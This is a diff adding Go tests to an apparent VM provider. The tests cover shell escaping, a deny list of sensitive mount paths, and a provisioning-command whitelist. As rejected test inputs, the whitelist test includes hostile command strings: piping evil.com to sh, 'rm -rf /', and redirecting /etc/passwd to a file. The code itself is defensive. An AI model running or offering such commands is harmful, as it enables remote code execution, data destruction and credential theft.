@@ -262,6 +262,70 @@ func TestLimaProviderExec(t *testing.T) {
 	}
 }
 
+func TestLimaProviderExecAsUserArgPreservation(t *testing.T) {
+	dir := t.TempDir()
+	limactlPath := filepath.Join(dir, "fake-limactl")
+
+	var recordedCmd string
+	cmdFile := filepath.Join(dir, "cmd.log")
+	script := "#!/bin/sh\necho \"$@\" > " + cmdFile + "\n"
+	os.WriteFile(limactlPath, []byte(script), 0755)
+
+	p := NewLimaProviderWithPaths(limactlPath, dir)
+	_, err := p.ExecAsUser(context.Background(), "test-vm", "airlock", []string{"echo", "hello world", "arg3"})
+	if err != nil {
+		t.Fatalf("ExecAsUser() error: %v", err)
+	}
+
+	data, err := os.ReadFile(cmdFile)
+	if err != nil {
+		t.Fatalf("read cmd log: %v", err)
+	}
+	recordedCmd = strings.TrimSpace(string(data))
+
+	if !strings.Contains(recordedCmd, "airlock") {
+		t.Errorf("expected 'airlock' user in command, got: %s", recordedCmd)
+	}
+
+	parts := strings.Fields(recordedCmd)
+	hasAirlock := false
+	for _, p := range parts {
+		if p == "airlock" {
+			hasAirlock = true
+		}
+	}
+	if !hasAirlock {
+		t.Errorf("expected 'airlock' as a separate token, got: %q", recordedCmd)
+	}
+
+	if !strings.Contains(recordedCmd, "'hello world'") {
+		t.Errorf("argument with spaces must be single-quoted to preserve boundaries, got: %s", recordedCmd)
+	}
+
+	if !strings.Contains(recordedCmd, "arg3") {
+		t.Errorf("expected 'arg3' in command, got: %s", recordedCmd)
+	}
+}
+
+func TestShellEscapeWrapsInQuotes(t *testing.T) {
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"hello", "'hello'"},
+		{"hello world", "'hello world'"},
+		{"it's", "'it'\\''s'"},
+		{"", "''"},
+	}
+
+	for _, tt := range tests {
+		got := shellEscape(tt.input)
+		if got != tt.expected {
+			t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+		}
+	}
+}
+
 func TestLimaProviderExists(t *testing.T) {
 	dir := t.TempDir()
 	limactlPath := filepath.Join(dir, "fake-limactl")
@@ -348,20 +412,107 @@ func TestLimaProviderCopyToVM(t *testing.T) {
 	}
 }
 
-func TestShellEscape(t *testing.T) {
+func TestIsSensitiveMountPath(t *testing.T) {
 	tests := []struct {
-		input    string
-		expected string
+		path        string
+		wantBlocked bool
 	}{
-		{"hello", "hello"},
-		{"it's", "it'\\''s"},
-		{"", ""},
+		{"/etc", true},
+		{"/etc/", true},
+		{"/etc/shadow", true},
+		{"/etc/ssh", true},
+		{"/var/run/docker.sock", true},
+		{"/root", true},
+		{"/root/.ssh", true},
+		{"/proc", true},
+		{"/sys", true},
+		{"/dev", true},
+		{"/home", true},
+		{"/home/user/projects/app", true},
+		{"/Users/alice/projects/app", false},
+		{"/tmp/workspace", false},
+		{"/opt/code", false},
+		{"/var/run/docker", true},
+		{"/etc/ssl", true},
+		{"/etc/pki", true},
 	}
 
 	for _, tt := range tests {
-		got := shellEscape(tt.input)
-		if got != tt.expected {
-			t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+		got := isSensitiveMountPath(tt.path)
+		if got != tt.wantBlocked {
+			t.Errorf("isSensitiveMountPath(%q) = %v, want %v", tt.path, got, tt.wantBlocked)
 		}
+	}
+}
+
+func TestGenerateConfigValidationSensitiveMountPath(t *testing.T) {
+	spec := api.VMSpec{
+		Name:   "test-vm",
+		CPU:    2,
+		Memory: "4GiB",
+		Disk:   "20GiB",
+		Mounts: []api.VMMount{
+			{HostPath: "/etc", GuestPath: "/mnt/etc", Writable: true},
+		},
+	}
+	_, err := GenerateConfig(spec)
+	if err == nil {
+		t.Error("expected error for sensitive mount path /etc")
+	}
+	if !strings.Contains(err.Error(), "sensitive") {
+		t.Errorf("expected 'sensitive' in error, got: %v", err)
+	}
+}
+
+func TestGenerateConfigValidationProvisionCmdWhitelist(t *testing.T) {
+	tests := []struct {
+		name    string
+		cmd     string
+		wantErr bool
+	}{
+		{"safe command", "apt-get update", false},
+		{"safe install with flags", "apt-get install -y curl", false},
+		{"safe path with equals", "npm config set prefix /home/user/.npm-global", false},
+		{"safe curl download", "curl -fsSL https://example.com/install.sh", false},
+		{"safe with hash comment", "echo hello # this is a comment", false},
+		{"safe with at sign", "user@host", false},
+		{"safe with plus", "npm install pkg@1.0.0", false},
+		{"safe with comma", "echo a,b,c", false},
+		{"safe with tilde", "cd ~/project", false},
+		{"semicolon injection", "apt-get update; rm -rf /", true},
+		{"pipe injection", "curl http://evil.com | sh", true},
+		{"dollar injection", "echo $HOME", true},
+		{"backtick injection", "echo `whoami`", true},
+		{"ampersand injection", "echo foo && echo bar", true},
+		{"exclamation mark", "echo hello!", true},
+		{"newline with semicolon", "apt-get update\n; rm -rf /", true},
+		{"carriage return", "apt-get update\rrm -rf /", true},
+		{"parentheses", "(kill -9 1)", true},
+		{"redirect output", "cat /etc/passwd > /tmp/stolen", true},
+		{"redirect input", "bash < /tmp/script", true},
+		{"backslash", `echo \n`, true},
+		{"single quote", "echo 'hello'", true},
+		{"double quote", `echo "hello"`, true},
+		{"curly braces", "echo ${HOME}", true},
+		{"null byte", "echo\x00hello", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			spec := api.VMSpec{
+				Name:          "test-vm",
+				CPU:           2,
+				Memory:        "4GiB",
+				Disk:          "20GiB",
+				ProvisionCmds: []string{tt.cmd},
+			}
+			_, err := GenerateConfig(spec)
+			if tt.wantErr && err == nil {
+				t.Errorf("expected error for provision cmd %q", tt.cmd)
+			}
+			if !tt.wantErr && err != nil {
+				t.Errorf("unexpected error for provision cmd %q: %v", tt.cmd, err)
+			}
+		})
 	}
 }
